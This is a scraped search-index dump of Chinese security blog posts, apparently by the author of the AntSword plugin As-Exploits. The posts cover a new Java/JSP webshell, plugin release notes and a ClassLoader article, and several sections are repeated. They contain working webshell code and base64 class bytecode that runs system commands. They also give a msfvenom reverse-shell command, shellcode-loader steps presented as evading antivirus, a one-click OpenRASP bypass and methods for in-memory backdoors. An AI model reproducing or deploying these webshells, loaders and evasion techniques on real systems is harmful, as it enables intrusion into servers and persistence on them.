response.setCharacterEncoding(cs); function Base64DecodeToByte(str) { importPackage(Packages.sun.misc); importPackage(Packages.java.util); var bt; try { bt = new BASE64Decoder().decodeBuffer(str); } catch (e) { bt = new Base64().getDecoder().decode(str); } return bt; } function define(Classdata, cmd) { var classBytes = Base64DecodeToByte(Classdata); var byteArray = Java.type(\"byte[]\"); var int = Java.type(\"int\"); var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod( \"defineClass\", byteArray.class, int.class, int.class ); defineClassMethod.setAccessible(true); var cc = defineClassMethod.invoke( Thread.currentThread().getContextClassLoader(), classBytes, 0, classBytes.length ); return cc.getConstructor(java.lang.String.class).newInstance(cmd); } output.append( define( \"yv66vgAAADQAKQoABwAZCgAaABsKABoAHAcAHQoABAAeBwAfBwAgAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAGTGNhbGM7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAHwcAIQcAHQEAClNvdXJjZUZpbGUBAAljYWxjLmphdmEMAAgAIgcAIwwAJAAlDAAmACcBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAoACIBAARjYWxjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBAAMoKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABgAHAAAAAAABAAEACAAJAAEACgAAAIgAAgADAAAAFSq3AAG4AAIrtgADV6cACE0stgAFsQABAAQADAAPAAQAAwALAAAAGgAGAAAABAAEAAYADAAJAA8ABwAQAAgAFAAKAAwAAAAgAAMAEAAEAA0ADgACAAAAFQAPABAAAAAAABUAEQASAAEAEwAAABMAAv8ADwACBwAUBwAVAAEHABYEAAEAFwAAAAIAGA==\", \"calc\" ) ); response.getWriter().print(output); 成功弹出计算器 也就是说，新型一句话在特殊情况下，还可以继续兼容原有的字节码一句话，甚至复用原有的Payload。 ","date":"2021-06-19","objectID":"/posts/a-new-type-java-webshell/:6:0","series":null,"tags":[],"title":"一种新型Java一句话木马的实现","uri":"/posts/a-new-type-java-webshell/#保底操作"},{"categories":["技术文章"],"content":"\r7 测试测试环境：Java\u003e=6 同样的列目录Payload，原有的字节码方式数据包长度为7378，而新型JSP一句话仅仅为2481，差不多为原有的三分之一。 列目录 中文测试 虚拟终端 数据库连接 ","date":"2021-06-19","objectID":"/posts/a-new-type-java-webshell/:7:0","series":null,"tags":[],"title":"一种新型Java一句话木马的实现","uri":"/posts/a-new-type-java-webshell/#测试"},{"categories":["技术文章"],"content":"\r8 最后基于JS引擎的Java一句话体积更小，变化种类更多，使用起来更灵活。范围为Java 6及以上，基本可以满足需求，但是Payload写起来非常麻烦，也不好调试，算是有利有弊。 提出新型一句话并不是说一定要取代原有的打入字节码的方式，只是在更复杂情况下，可以提供给渗透人员更多的选择。 项目地址： https://github.com/AntSwordProject/antSword/commit/a6efa86f5959204140d73092b010fe0739208385 ","date":"2021-06-19","objectID":"/posts/a-new-type-java-webshell/:8:0","series":null,"tags":[],"title":"一种新型Java一句话木马的实现","uri":"/posts/a-new-type-java-webshell/#最后"},{"categories":["技术文章"],"content":"\r8.1 ","date":"2021-06-19","objectID":"/posts/a-new-type-java-webshell/:8:1","series":null,"tags":[],"title":"一种新型Java一句话木马的实现","uri":"/posts/a-new-type-java-webshell/#heading"},{"categories":["技术文章"],"content":"\r8.2 ","date":"2021-06-19","objectID":"/posts/a-new-type-java-webshell/:8:2","series":null,"tags":[],"title":"一种新型Java一句话木马的实现","uri":"/posts/a-new-type-java-webshell/#heading-1"},{"categories":["技术文章"],"content":"As-Exploits v1.3更新","date":"2021-05-14","objectID":"/posts/as-exploits-v13-update/","series":null,"tags":[],"title":"As-Exploits v1.3更新","uri":"/posts/as-exploits-v13-update/"},{"categories":["技术文章"],"content":"\r1 更新主要内容","date":"2021-05-14","objectID":"/posts/as-exploits-v13-update/:1:0","series":null,"tags":[],"title":"As-Exploits v1.3更新","uri":"/posts/as-exploits-v13-update/#更新主要内容"},{"categories":["技术文章"],"content":"\r1.1 v 1.3 (2021/5/14) equals支持数组传参方式，兼容各种容器 jsp新增 ShellCode加载器模块，内置两种分别基于jna跟java agent的shellcode加载方式 jsp新增 Bypass OpenRASP 模块，thx@Godzilla JarLoader模块 新增手动上传方式，解决因Tomcat最大POST长度为2m导致无法加载内存Jar的问题 reGeorg内存马改为更稳定的neo-reGerog，默认密码：asexploits 冰蝎内存马支持3.7，去除pageContext依赖，兼容Spring等容器 各模块兼容JDK5 挑几个重点的说说 ","date":"2021-05-14","objectID":"/posts/as-exploits-v13-update/:1:1","series":null,"tags":[],"title":"As-Exploits v1.3更新","uri":"/posts/as-exploits-v13-update/#v-13-2021514"},{"categories":["技术文章"],"content":"\r2 Shell入口参数支持数组形式Shell入口参数即下面new Object[]{request,response}的部分。 \u003c% String cls = request.getParameter(\"ant\"); if (cls != null) { new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(new Object[]{request,response}); } %\u003e 至于为什么要改这个玩意要从内存马的兼容说起。 除了由于写法问题而导致的各种乱七八糟的问题以外，连接内存马的一个主要问题是冰蝎在入口处采用了pageContext这个类来获取request response session对象。但是以filter型内存马为例，doFilter中三个参数分别是ServletRequest，ServletResponse，FilterChain，并不存在pageContext这个东西，并且在SpringBoot这种容器里根本没有pageContext这个类。 于是就有跟多师傅提出了自己的解决办法，大体分为三种： 自己声明一个pageContext类，在里面实现对应的request跟response的getter setter。冰蝎改造之不改动客户端=\u003e内存马。 改写冰蝎的入口为request+response，不再采用pageContext作为入口。但是弊端就是不能再用equals了，要重新写一个方法用反射调用。冰蝎改造之适配基于tomcat Filter的无文件webshell 采用蚁剑原来的Custom模式，把恶意函数直接通过字节码打进去，然后通过方法名调用。不过由于直接编译恶意函数的字节码较大会超过最大长度限制，一般要先写入目标然后配合URLClassLoader才能使用。使用WebLogic CVE-2020-2883配合Shiro rememberMe反序列化一键注入蚁剑shell 以上的这些方法可以是可以，但是不够优雅。 回想我们最开始的问题，为什么要用pageContext，是为了拿到当前请求的上下文，更精确一点就是输入输出：request,response。request是接收参数，response是回显，两者缺一不可。 后来自己调试的时候发现在request中本身就包含了当前的response，同样response中也包含了当前的request。 当时就想着我shell中传个request，然后在payload里面利用反射把requst里面的response取出来，或者response里面的request取出来不就完事了？ 这样确实可以，在2020年9月4日，勤劳的我一大早就起来写了一波代码，然后发了上去，commit记录可以证明我没有瞎bb。当时蚁剑算是最早兼容内存马的。 因为Tomcat喜欢用门面模式，所以要反射两层，结果后来发现在WebLogic下用不了了，因为WebLogic不喜欢搞门面模式，只需要反射一层就够了。 行吧，那我就再加一种情况，在JSP V1.4版本又增加了一层反射的情况。 本来以为没事了，后来又发现在有shiro的情况下打一个servlet内存马进去，这时候去连接内存马需要反射三次？？ WTF？？？ 然后意识到，这种case by case的解决方式是不行的，世界上还有那么多种Web容器中间件，不可能一个一个去调吧。 所以为了彻底解决这个问题，在520师傅的建议下采用了数组的方式将两者直接传进去，把分析的逻辑放在打内存Shell的时候去做，而不在payload里面去做。 现在冰蝎跟哥斯拉也都有了相应的机制，思路大体是一样的，感兴趣的小伙伴可以自己研究一下。 ","date":"2021-05-14","objectID":"/posts/as-exploits-v13-update/:2:0","series":null,"tags":[],"title":"As-Exploits v1.3更新","uri":"/posts/as-exploits-v13-update/#shell入口参数支持数组形式"},{"categories":["技术文章"],"content":"\r3 JarLoader模块新增手动上传方式\r3.0.1 内存加载直接通过HTTP包将Jar打入目标内存，仅需选择本地需要上传的Jar文件即可，期间文件不落地。但是Tomcat默认POST最大上传大小为2M，如果超过了此大小请选择手动上传模式。 3.0.2 手动上传先手动将Jar上传到目标服务器上，然后通过路径加载。 ","date":"2021-05-14","objectID":"/posts/as-exploits-v13-update/:3:0","series":null,"tags":[],"title":"As-Exploits v1.3更新","uri":"/posts/as-exploits-v13-update/#jarloader模块新增手动上传方式"},{"categories":["技术文章"],"content":"\r3 JarLoader模块新增手动上传方式\r3.0.1 内存加载直接通过HTTP包将Jar打入目标内存，仅需选择本地需要上传的Jar文件即可，期间文件不落地。但是Tomcat默认POST最大上传大小为2M，如果超过了此大小请选择手动上传模式。 3.0.2 手动上传先手动将Jar上传到目标服务器上，然后通过路径加载。 ","date":"2021-05-14","objectID":"/posts/as-exploits-v13-update/:3:0","series":null,"tags":[],"title":"As-Exploits v1.3更新","uri":"/posts/as-exploits-v13-update/#内存加载"},{"categories":["技术文章"],"content":"\r3 JarLoader模块新增手动上传方式\r3.0.1 内存加载直接通过HTTP包将Jar打入目标内存，仅需选择本地需要上传的Jar文件即可，期间文件不落地。但是Tomcat默认POST最大上传大小为2M，如果超过了此大小请选择手动上传模式。 3.0.2 手动上传先手动将Jar上传到目标服务器上，然后通过路径加载。 ","date":"2021-05-14","objectID":"/posts/as-exploits-v13-update/:3:0","series":null,"tags":[],"title":"As-Exploits v1.3更新","uri":"/posts/as-exploits-v13-update/#手动上传"},{"categories":["技术文章"],"content":"\r4 JSP ShellCode加载器内置两种加载方式，使用之前请务必认真阅读使用说明，否则可能直接将Java进程打挂。 需要注意两点： 使用MSF需要加上PrependMigrate=true PrependMigrateProc=xxxx.exe参数，自动迁移到新的进程，否则会在migrate/exit的时候把Java进程给干掉，导致网站瘫痪。例如：msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.88.129 LPORT=8888 PrependMigrate=true PrependMigrateProc=svchost.exe -f hex JNA方式只需要X86类型的ShellCode即可，而Attach方式需要根据目标Java位数来选择对应的ShellCode。 ","date":"2021-05-14","objectID":"/posts/as-exploits-v13-update/:4:0","series":null,"tags":[],"title":"As-Exploits v1.3更新","uri":"/posts/as-exploits-v13-update/#jsp-shellcode加载器"},{"categories":["技术文章"],"content":"\r4.1 JNA方式利用第三方库JNA进行ShellCode的加载。 适用范围：JDK\u003e=1.5 4.1.1 正确操作 首先利用Jar加载器将ShellCodeLoader.jar上传到目标服务器目录并加载。 使用MSF或者CS生成x86类型的shellcode，并开启监听。 在ShellCode加载器模块，输入hex或者java格式的shellcode，且不能有多余换行跟空格。 点击exploit，等待返回回话。 4.1.2 JNA方式测试装了360，火绒，电脑管家 上传插件ext目录下的ShellcodeLoader.jar到目标服务器，然后复制文件路径 手动加载到JVM中 MSF生成Shellcode 选择JNA方式，exploit! 直接上线，杀软没有拦截 关于jna会生成一个临时文件的问题，发现确实会生成一个dll临时文件在Tomcat临时目录下 但是扫了一下发现是免杀的 VT检测结果0/68，也就是说落地也问题不大。 不过可能这篇文章出来之后就没了 ","date":"2021-05-14","objectID":"/posts/as-exploits-v13-update/:4:1","series":null,"tags":[],"title":"As-Exploits v1.3更新","uri":"/posts/as-exploits-v13-update/#jna方式"},{"categories":["技术文章"],"content":"\r4.1 JNA方式利用第三方库JNA进行ShellCode的加载。 适用范围：JDK\u003e=1.5 4.1.1 正确操作 首先利用Jar加载器将ShellCodeLoader.jar上传到目标服务器目录并加载。 使用MSF或者CS生成x86类型的shellcode，并开启监听。 在ShellCode加载器模块，输入hex或者java格式的shellcode，且不能有多余换行跟空格。 点击exploit，等待返回回话。 4.1.2 JNA方式测试装了360，火绒，电脑管家 上传插件ext目录下的ShellcodeLoader.jar到目标服务器，然后复制文件路径 手动加载到JVM中 MSF生成Shellcode 选择JNA方式，exploit! 直接上线，杀软没有拦截 关于jna会生成一个临时文件的问题，发现确实会生成一个dll临时文件在Tomcat临时目录下 但是扫了一下发现是免杀的 VT检测结果0/68，也就是说落地也问题不大。 不过可能这篇文章出来之后就没了 ","date":"2021-05-14","objectID":"/posts/as-exploits-v13-update/:4:1","series":null,"tags":[],"title":"As-Exploits v1.3更新","uri":"/posts/as-exploits-v13-update/#正确操作"},{"categories":["技术文章"],"content":"\r4.1 JNA方式利用第三方库JNA进行ShellCode的加载。 适用范围：JDK\u003e=1.5 4.1.1 正确操作 首先利用Jar加载器将ShellCodeLoader.jar上传到目标服务器目录并加载。 使用MSF或者CS生成x86类型的shellcode，并开启监听。 在ShellCode加载器模块，输入hex或者java格式的shellcode，且不能有多余换行跟空格。 点击exploit，等待返回回话。 4.1.2 JNA方式测试装了360，火绒，电脑管家 上传插件ext目录下的ShellcodeLoader.jar到目标服务器，然后复制文件路径 手动加载到JVM中 MSF生成Shellcode 选择JNA方式，exploit! 直接上线，杀软没有拦截 关于jna会生成一个临时文件的问题，发现确实会生成一个dll临时文件在Tomcat临时目录下 但是扫了一下发现是免杀的 VT检测结果0/68，也就是说落地也问题不大。 不过可能这篇文章出来之后就没了 ","date":"2021-05-14","objectID":"/posts/as-exploits-v13-update/:4:1","series":null,"tags":[],"title":"As-Exploits v1.3更新","uri":"/posts/as-exploits-v13-update/#jna方式测试"},{"categories":["技术文章"],"content":"\r4.2 Attach模拟java agent注入过程来实现Shellcode的加载。这个native方法是jdk自带的，并且经过oracle签名的，理论上免杀效果更好。 适用范围：JDK\u003e=1.6 4.2.1 正确操作 基本信息，exploit，Ctrl+F 搜索 sun.arch.data.model，查看java位数 根据java位数生成对应位数的shellcode，并开启监听。 在ShellCode加载器模块，输入hex或者java格式的shellcode，且不能有多余换行跟空格。 点击exploit，等待返回回话。 4.2.2 Attach方式测试发现是64位java CS生成对应位数的shellcode，选择java格式导出。 粘贴到插件中，在exploit的一刻会自动格式化为hex 直接上线，杀软没有拦截。 ","date":"2021-05-14","objectID":"/posts/as-exploits-v13-update/:4:2","series":null,"tags":[],"title":"As-Exploits v1.3更新","uri":"/posts/as-exploits-v13-update/#attach"},{"categories":["技术文章"],"content":"\r4.2 Attach模拟java agent注入过程来实现Shellcode的加载。这个native方法是jdk自带的，并且经过oracle签名的，理论上免杀效果更好。 适用范围：JDK\u003e=1.6 4.2.1 正确操作 基本信息，exploit，Ctrl+F 搜索 sun.arch.data.model，查看java位数 根据java位数生成对应位数的shellcode，并开启监听。 在ShellCode加载器模块，输入hex或者java格式的shellcode，且不能有多余换行跟空格。 点击exploit，等待返回回话。 4.2.2 Attach方式测试发现是64位java CS生成对应位数的shellcode，选择java格式导出。 粘贴到插件中，在exploit的一刻会自动格式化为hex 直接上线，杀软没有拦截。 ","date":"2021-05-14","objectID":"/posts/as-exploits-v13-update/:4:2","series":null,"tags":[],"title":"As-Exploits v1.3更新","uri":"/posts/as-exploits-v13-update/#正确操作-1"},{"categories":["技术文章"],"content":"\r4.2 Attach模拟java agent注入过程来实现Shellcode的加载。这个native方法是jdk自带的，并且经过oracle签名的，理论上免杀效果更好。 适用范围：JDK\u003e=1.6 4.2.1 正确操作 基本信息，exploit，Ctrl+F 搜索 sun.arch.data.model，查看java位数 根据java位数生成对应位数的shellcode，并开启监听。 在ShellCode加载器模块，输入hex或者java格式的shellcode，且不能有多余换行跟空格。 点击exploit，等待返回回话。 4.2.2 Attach方式测试发现是64位java CS生成对应位数的shellcode，选择java格式导出。 粘贴到插件中，在exploit的一刻会自动格式化为hex 直接上线，杀软没有拦截。 ","date":"2021-05-14","objectID":"/posts/as-exploits-v13-update/:4:2","series":null,"tags":[],"title":"As-Exploits v1.3更新","uri":"/posts/as-exploits-v13-update/#attach方式测试"},{"categories":["技术文章"],"content":"\r5 一键Bypass OpenRASP借鉴自哥斯拉的插件：Godzilla-BypassOpenRasp 一键绕过OpenRASP 目标安装有OpenRASP且开启命令执行拦截 exploit! 再次运行，即可执行命令 ","date":"2021-05-14","objectID":"/posts/as-exploits-v13-update/:5:0","series":null,"tags":[],"title":"As-Exploits v1.3更新","uri":"/posts/as-exploits-v13-update/#一键bypass-openrasp"},{"categories":["技术文章"],"content":"\r6 其他 reGeorg内存马改为更稳定的neo-reGerog，默认密码：asexploits 冰蝎内存马去除pageContext依赖，兼容Spring等容器 各模块兼容JDK5 ","date":"2021-05-14","objectID":"/posts/as-exploits-v13-update/:6:0","series":null,"tags":[],"title":"As-Exploits v1.3更新","uri":"/posts/as-exploits-v13-update/#其他"},{"categories":["技术文章"],"content":"\r7 项目地址https://github.com/yzddmr6/As-Exploits 来颗star吧~ ","date":"2021-05-14","objectID":"/posts/as-exploits-v13-update/:7:0","series":null,"tags":[],"title":"As-Exploits v1.3更新","uri":"/posts/as-exploits-v13-update/#项目地址"},{"categories":["技术文章"],"content":"\r1 前言补上上次星球无奖问答环节的坑。(本来北辰师傅在星球中没改马甲名字，后来才知道下面回答的是北辰师傅，emmmm尴尬尴尬) 起因是小伙伴在hvv的过程中发现WAF会拦截Webshell中defineClass这个函数，因为反射可以把我们需要调用的方法放到一个字符串的位置，就可以产生各种变形，所以就想通过反射来绕过。 于是乎就劈里啪啦写了这样一段代码： Method defineClass = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class); defineClass.setAccessible(true); defineClass.invoke(ClassLoader.getSystemClassLoader(), bytes, 0, bytes.length) 然后发现第一次连接可以，第二次再刷新就会一直提示类重复加载的错误。 其实这个问题主要涉及到对JAVA中类加载机制的理解，于是就引申出来另一个问题：为什么冰蝎跟蚁剑原来的shell就不会提示类重复加载的错误呢。在这篇文章里跟大家分享一下自己的理解。 ","date":"2021-04-30","objectID":"/posts/interesting-classloader/:1:0","series":null,"tags":[],"title":"ClassLoader的理解","uri":"/posts/interesting-classloader/#前言"},{"categories":["技术文章"],"content":"\r2 ClassLoader的特性关于类加载机制已经有很多文章，在这个问题上主要涉及到其中一个知识点： 一个类，如果由不同的类加载器实例加载的话，会在方法区产生两个不同的类，彼此不可见，并且在堆中生成不同Class实例。 这里我们做一个小实验，首先写一个测试的目标类，就是简单的弹一个计算器。 package com; import java.io.IOException; public class calc { public calc() { } static { try { Runtime.getRuntime().exec(\"calc\"); } catch (IOException e) { e.printStackTrace(); } } } 编译然后获取class文件的base64结果，放入到下面代码中。 需要注意的是，完成之后需要在idea中把上面弹计算器的类给删掉，这样才能模拟加载一个不存在类的效果。 package loader; import java.util.Base64; public class test1 { public static class DefineLoader extends ClassLoader { public Class load(byte[] bytes) { return super.defineClass(null, bytes, 0, bytes.length); } } public static void main(String[] args) { String cls = \"yv66vgAAADQAJgoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAApMY29tL2NhbGM7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAHAEAClNvdXJjZUZpbGUBAAljYWxjLmphdmEMAAkACgcAIAwAIQAiAQAEY2FsYwwAIwAkAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAJQAKAQAIY29tL2NhbGMBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAgABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAUADQAAAAwAAQAAAAUADgAPAAAACAAQAAoAAQALAAAAYQACAAEAAAASuAACEgO2AARXpwAISyq2AAaxAAEAAAAJAAwABQADAAwAAAAWAAUAAAAIAAkACwAMAAkADQAKABEADAANAAAADAABAA0ABAARABIAAAATAAAABwACTAcAFAQAAQAVAAAAAgAW\"; byte[] bytes = Base64.getDecoder().decode(cls); DefineLoader defineLoader1 = new DefineLoader(); try { defineLoader1.load(bytes); } catch (Exception e) { e.printStackTrace(); } DefineLoader defineLoader2 =new DefineLoader(); try { Class.forName(\"com.calc\",true,defineLoader1); } catch (ClassNotFoundException e) { e.printStackTrace(); } } } 运行之后发现弹出了计算器，因为此时我们加载这个类的ClassLoader就是defineLoader1。 接着修改Class.forname的类加载器为另一个defineLoader2再运行 try { Class.forName(\"com.calc\",true,defineLoader2); } catch (ClassNotFoundException e) { e.printStackTrace(); } 这个时候因为使用的另一个不同的类加载器进行加载，所以就提示找不到这个类了 再做一个实验，打印两个Class的hashCode，发现两者确实是不同的。 package loader; import java.util.Base64; public class test1 { public static class DefineLoader extends ClassLoader { public Class load(byte[] bytes) { return super.defineClass(null, bytes, 0, bytes.length); } } public static void main(String[] args) { String cls = \"yv66vgAAADQAJgoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAApMY29tL2NhbGM7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAHAEAClNvdXJjZUZpbGUBAAljYWxjLmphdmEMAAkACgcAIAwAIQAiAQAEY2FsYwwAIwAkAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAJQAKAQAIY29tL2NhbGMBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAgABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAUADQAAAAwAAQAAAAUADgAPAAAACAAQAAoAAQALAAAAYQACAAEAAAASuAACEgO2AARXpwAISyq2AAaxAAEAAAAJAAwABQADAAwAAAAWAAUAAAAIAAkACwAMAAkADQAKABEADAANAAAADAABAA0ABAARABIAAAATAAAABwACTAcAFAQAAQAVAAAAAgAW\"; byte[] bytes = Base64.getDecoder().decode(cls); DefineLoader defineLoader1 = new DefineLoader(); DefineLoader defineLoader2 =new DefineLoader(); try { Class cls1 = defineLoader1.load(bytes); System.out.println(cls1.hashCode()); Class cls2 = defineLoader2.load(bytes); System.out.println(cls2.hashCode()); } catch (Exception e) { e.printStackTrace(); } } } 在JAVA世界里，决定一个类的唯一性主要有两点： 类名 他的类加载器。 比较两个类是否“相等”，只有在这两个类是由同一个类加载器加载的前提下才有意义，否则，即使这两个类来源于同一个Class文件，被同一个虚拟机加载，只要加载它们的类加载器不同，那这两个类就必定不相等。 所以在每次打过去的类名都是相同的情况下，我们只要保证这两个类是由不同的加载器去加载的就可以解决类重复加载的问题了。 所以冰蝎、蚁剑的jsp shell在每次调用之前都会去new一个新的类加载器来加载对应的字节码，这样就可以保证不会出现类重复加载的问题。 那么应该怎么用反射写呢？ 原来的shell中是写了一个子类继承ClassLoader，我们完全可以从jdk中找一个同样继承ClassLoader并且没有改写defineClass的子类 在这里我们选择java.security.SecureClassLoader这个类，每次去new一个这个类，然后defineClass.invoke的时候把new出来的ClassLoader实例给","date":"2021-04-30","objectID":"/posts/interesting-classloader/:2:0","series":null,"tags":[],"title":"ClassLoader的理解","uri":"/posts/interesting-classloader/#classloader的特性"},{"categories":["技术文章"],"content":"\r3 最后研究过内存马的同学可以发现，很多内存马都继承了ClassLoader这个类，原因就是如果新建一个子类的话，内部类会单独产生一个class文件，导致没办法一次性打过去。所以就干脆把外部类变成ClassLoader的子类，直接调用本类的defineClass方法来加载恶意字节码。 但是在一些特殊情况下，比如说用TemplatesImpl打进去的时候，我们需要让恶意类来继承AbstractTranslet这个父类才可以，但是JAVA的设定是不能继承多个类。所以很多文章都是用TemplatesImpl的恶意类再去defineClass加载真正的内存马，这样就有点麻烦了。如果用本文中的写法，就不需要再继承ClassLoader了。 ","date":"2021-04-30","objectID":"/posts/interesting-classloader/:3:0","series":null,"tags":[],"title":"ClassLoader的理解","uri":"/posts/interesting-classloader/#最后"},{"categories":["技术文章"],"content":"As-Exploits v1.2更新","date":"2021-03-26","objectID":"/posts/as-exploits-v12-update/","series":null,"tags":[],"title":"As-Exploits v1.2更新","uri":"/posts/as-exploits-v12-update/"},{"categories":["技术文章"],"content":"\r1 前言As-Exploits，中国蚁剑后渗透模块。 目前插件的定位是蚁剑的一个微内核拓展模块，可以迅速做到payload的工程化，不用过多时间浪费在插件的结构上。目前的As-Exlpoits各部分之间基本做到了解耦，新增一个payload只需要两步：1.填写payload，2. 画一个表单。其余发包，回显处理等事情框架会自动帮你实现。想要自定义的话只需要继承父类然后重写对应方法即可。 其中Payload部分很多借鉴了冰蝎跟哥斯拉的实现，向其开发者们表示感谢！ ","date":"2021-03-26","objectID":"/posts/as-exploits-v12-update/:1:0","series":null,"tags":[],"title":"As-Exploits v1.2更新","uri":"/posts/as-exploits-v12-update/#前言"},{"categories":["技术文章"],"content":"\r2 支持列表 模块名称\\Shell类型 PHP ASPX JSP 基本信息 √ √ √ 反弹Shell √ √ √ 内存马 √ 内存马管理 √ 杀软识别 √ √ √ 提权辅助 √ √ √ 屏幕截图 √ √ ShellCode加载器 √ Jar加载器 √ ","date":"2021-03-26","objectID":"/posts/as-exploits-v12-update/:2:0","series":null,"tags":[],"title":"As-Exploits v1.2更新","uri":"/posts/as-exploits-v12-update/#支持列表"},{"categories":["技术文章"],"content":"\r3 本次更新主要内容","date":"2021-03-26","objectID":"/posts/as-exploits-v12-update/:3:0","series":null,"tags":[],"title":"As-Exploits v1.2更新","uri":"/posts/as-exploits-v12-update/#本次更新主要内容"},{"categories":["技术文章"],"content":"\r3.1 aspx增加屏幕截图模块我打我自己 当然实战中需要较高权限。 因为在Jscript加载Assembly踩坑记里面解决了Jscript加载c#的问题，所以C#的payload理论上都可以加进去，更多其他的用法就看大家自己发挥了 ","date":"2021-03-26","objectID":"/posts/as-exploits-v12-update/:3:1","series":null,"tags":[],"title":"As-Exploits v1.2更新","uri":"/posts/as-exploits-v12-update/#aspx增加屏幕截图模块"},{"categories":["技术文章"],"content":"\r3.2 jsp增加Jar加载器模块打一个jar进去通常有两个用处： 一是可以用来上传数据库驱动。 二是把恶意类打入JVM中，后续只需要通过反射调用即可。哥斯拉的实现方式就是第一次就把所有的payload打入jvm中，后续通过反射调用。所以后续通信的流量包都非常的小，只需要传递参数即可。 冰蝎跟哥斯拉都有类似的功能，研究了一下他们的实现。 3.2.1 冰蝎冰蝎的加载jar功能内嵌于数据库连接部分，仅用于上传数据库驱动。首先把要打入的jdbc上传到目标的临时目录，然后再用URLClassLoader去加载，这里贴一下代码。 net.rebeyond.behinder.ui.controller.DatabaseViewController#loadDriver private void loadDriver(String scriptType, String databaseType) throws Exception { String driverPath = \"net/rebeyond/behinder/resource/driver/\"; Platform.runLater(() -\u003e { this.statusLabel.setText(\"正在上传数据库驱动……\"); }); String os = this.currentShellService.shellEntity.getString(\"os\").toLowerCase(); //根据系统型号选择临时目录 String remoteDir = os.indexOf(\"windows\") \u003e= 0 ? \"c:/windows/temp/\" : \"/tmp/\"; String libName = null; if (scriptType.equals(\"jsp\")) { //根据类型选择数据库jdbc if (databaseType.equals(\"sqlserver\")) { libName = \"sqljdbc41.jar\"; } else if (databaseType.equals(\"mysql\")) { libName = \"mysql-connector-java-5.1.36.jar\"; } else if (databaseType.equals(\"oracle\")) { libName = \"ojdbc5.jar\"; } } else if (scriptType.equals(\"aspx\")) { if (databaseType.equals(\"mysql\")) { libName = \"mysql.data.dll\"; } else if (databaseType.equals(\"oracle\")) { libName = \"Oracle.ManagedDataAccess.dll\"; } } byte[] driverFileContent = Utils.getResourceData(driverPath + libName); String remotePath = remoteDir + libName; //将jar先上传到临时目录 this.currentShellService.uploadFile(remotePath, driverFileContent, true); Platform.runLater(() -\u003e { this.statusLabel.setText(\"驱动上传成功，正在加载驱动……\"); }); //将libPath传递给服务端加载 JSONObject loadRes = this.currentShellService.loadJar(remotePath); if (loadRes.getString(\"status\").equals(\"fail\")) { throw new Exception(\"驱动加载失败:\" + loadRes.getString(\"msg\")); } else { Platform.runLater(() -\u003e { if (scriptType.equals(\"jsp\")) { this.statusLabel.setText(\"驱动加载成功，请再次点击“连接”。\"); } this.statusLabel.setText(\"驱动加载成功。\"); }); } } webshell获取到libPath然后用URLClassLoader去加载。 net.rebeyond.behinder.payload.java.Loader 3.2.2 哥斯拉哥斯拉的操作就比较秀了。因为打入一个jar不像打入一个class一样，直接有defineClass方法去接收一个字节数组。据我的研究，没有直接接收一个jar的字节数组的方法。打入jar需要使用URLClassLoader这个类，大概有两种方式，一种是利用http协议，远程获取所要加载的jar。另一种是file协议，从本地路径去读取jar。 每次都额外搭一个http当然不方便，并且目标还不一定出网。但是file协议的话还需要把jar写到磁盘中，文件就会落地，增加了被发现的风险。 但是我们回过头想，既然通过file协议加载jar，肯定会有一个通过路径找到文件，然后把文件读取到内存的过程，如果我们能跳过这个根据路径找文件的过程，直接把文件的内容写到字节数组里不就可以文件不落地了吗？ 哥斯拉就是采用的这种做法，利用两个子类分别继承了URLStreamHandler跟URLConnection，然后利用反射模拟了读取文件的过程。 创建了一种新的协议jarmembuff 然后把收到的jar文件的字节数组给放到变量里。 这样就实现了文件不落地，将jar打入内存的目的。 本人在As-Exploits里也采用了这种做法。 3.2.3 小实验这里做一个小实验 写一个弹框测试类 import java.io.IOException; public class calc { public calc() { try { 